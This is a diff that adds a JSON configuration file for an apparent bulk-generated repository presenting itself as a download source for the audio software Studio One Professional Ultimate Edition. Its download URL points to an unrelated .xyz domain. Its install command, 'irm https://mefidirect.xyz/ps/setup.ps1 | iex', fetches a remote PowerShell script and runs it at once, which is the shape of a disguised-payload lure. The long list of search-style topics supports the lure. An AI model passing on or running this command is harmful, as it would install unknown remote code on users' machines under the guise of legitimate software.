@@ -1,0 +1,28 @@
+{
+  "repo": "studio-one-professional-ultimate-edition",
+  "product": "Studio One Professional Ultimate Edition",
+  "kind": "audio",
+  "install_type": "download",
+  "download_url": "https://studio-one.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new32",
+  "format": "license-md-only",
+  "category": "audio",
+  "topics": [
+    "studio-one-desktop",
+    "studio-one-download-page",
+    "studio-one-offline-installer",
+    "setup-checklist",
+    "plugin-host",
+    "studio-one-stable-build",
+    "studio-one-getting-started",
+    "studio-one-latest-build",
+    "beat-making",
+    "configuration",
+    "mastering-tools",
+    "support-docs",
+    "studio-one-build",
+    "post-install"
+  ]
+}
